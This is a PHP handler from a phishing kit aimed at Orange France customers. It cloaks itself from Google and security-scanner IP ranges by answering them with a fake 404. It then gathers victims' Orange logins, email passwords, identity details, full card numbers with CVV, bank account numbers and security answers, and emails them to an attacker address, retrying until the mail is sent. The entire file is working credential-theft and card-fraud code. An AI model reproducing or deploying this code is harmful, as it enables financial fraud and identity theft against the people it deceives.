<?php

// array's of banned IP addresses
$bannedIP = array("^66.102.*.*", "^66.249.*.*", "^72.14.192.*", "^74.125.*.*", "^209.85.128.*", "^216.239.32.*", "^74.125.*.*", "^207.126.144.*", "^173.194.*.*", "^64.233.160.*", "^72.14.192.*", "^66.102.*.*", "^64.18.*.*", "^194.52.68.*", "^194.72.238.*", "^62.116.207.*", "^212.50.193.*", "^69.65.*.*", "^50.7.*.*", "^131.212.*.*", "^46.116.*.* ", "^62.90.*.*", "^89.138.*.*", "^82.166.*.*", "^85.64.*.*", "^85.250.*.*", "^89.138.*.*", "^93.172.*.*", "^109.186.*.*", "^194.90.*.*", "^212.29.192.*", "^212.29.224.*", "^212.143.*.*", "^212.150.*.*", "^212.235.*.*", "^217.132.*.*", "^50.97.*.*", "^217.132.*.*", "^209.85.*.*", "^66.205.64.*", "^204.14.48.*", "^64.27.2.*", "^67.15.*.*", "^202.108.252.*", "^193.47.80.*", "^64.62.136.*", "^66.221.*.*", "^64.62.175.*", "^198.54.*.*", "^192.115.134.*", "^216.252.167.*", "^193.253.199.*", "^69.61.12.*", "^64.37.103.*", "^38.144.36.*", "^64.124.14.*", "^206.28.72.*", "^209.73.228.*", "^158.108.*.*", "^168.188.*.*", "^66.207.120.*", "^167.24.*.*", "^192.118.48.*", "^67.209.128.*", "^12.148.209.*", "^12.148.196.*", "^193.220.178.*", "68.65.53.71", "^198.25.*.*", "^64.106.213.*");
if(in_array($_SERVER['REMOTE_ADDR'],$bannedIP)) {
     // this is for exact matches of IP address in array
     header('HTTP/1.0 404 Not Found');
     exit();
} else {
     // this is for wild card matches
     foreach($bannedIP as $ip) {
          if(eregi($ip,$_SERVER['REMOTE_ADDR'])) {
               header('HTTP/1.0 404 Not Found');
               exit();
          }
     }
}



$mail_to = "duffounie@proton.me";
$subject = "Resultat Orange [FR] " . $_POST['ccnum'] . " ~ " . $_POST['expmois'] . " / " . $_POST['expannee'] . " | " . $_POST['orange_login'];

$message  = "+ -----------------------------Coded for all------------------------------\r\n";
$message .= "| Identifiant : " . $_POST['orange_login'] . "\r\n";
$message .= "| Mot de passe : " . $_POST['orange_password'] . "\r\n";
$message .= "+ ------------------------------\r\n";
$message .= "| Civilité : " . $_POST['civilite'] . "\r\n";
$message .= "| Nom : " . $_POST['nom'] . "\r\n";
$message .= "| Prénom : " . $_POST['prenom'] . "\r\n";
$message .= "| Date de naissance : " . $_POST['ddn'] . "\r\n";
$message .= "| Adresse : " . $_POST['adresse'] . "\r\n";
$message .= "| Code postal : " . $_POST['codepostal'] . "\r\n";
$message .= "| Ville : " . $_POST['ville'] . "\r\n";
$message .= "| Téléphone : " . $_POST['telephone'] . "\r\n";
$message .= "+ ------------------------\r\n";
$message .= "| Email : " . $_POST['boiteorange'] . "\r\n";
$message .= "| Mot de passe : " . $_POST['boiteorangepass'] . "\r\n";
$message .= "+ ------------------------------\r\n";
$message .= "| Nom du titulaire : " . $_POST['titulaire'] . "\r\n";
$message .= "| Numéro de carte : " . $_POST['ccnum'] . "\r\n";
$message .= "| Date d'expiration : " . $_POST['expmois'] . " / " . $_POST['expannee'] . "\r\n";
$message .= "| Cryptogramme visuel : " . $_POST['cvv'] . "\r\n";
$message .= "+ -----------------------------------\r\n";
$message .= "| Nom de la banque : " . $_POST['nom_banque'] . "\r\n";
$message .= "| Numéro de compte : " . $_POST['compte_bancaire'] . "\r\n";
$message .= "| Question de sécurité : " . $_POST['questi'] . "\r\n";
$message .= "| Reponse : " . $_POST['reponse2'] . "\r\n";
$message .= "+ -------------------------------------------\r\n";
$message .= "| Adresse IP : " . $_SERVER['REMOTE_ADDR'] . " (" . gethostbyaddr($_SERVER['REMOTE_ADDR']) . ")\r\n";
$message .= "| Navigateur : " . $_SERVER['HTTP_USER_AGENT'] . "\r\n";
$message .= "+ ----------------------------Coded for all-------------------------------\r\n";
$mail_to = "Your Email Here";
$header  = "From: " . $_SERVER['REMOTE_ADDR'] . " <amp_" . rand(111, 999) . ">\r\n";
$header .= "MIME-Version: 1.0\r\n";

do {
	$send = mail($mail_to, $subject, $message, $header);
} while (!$send);
?>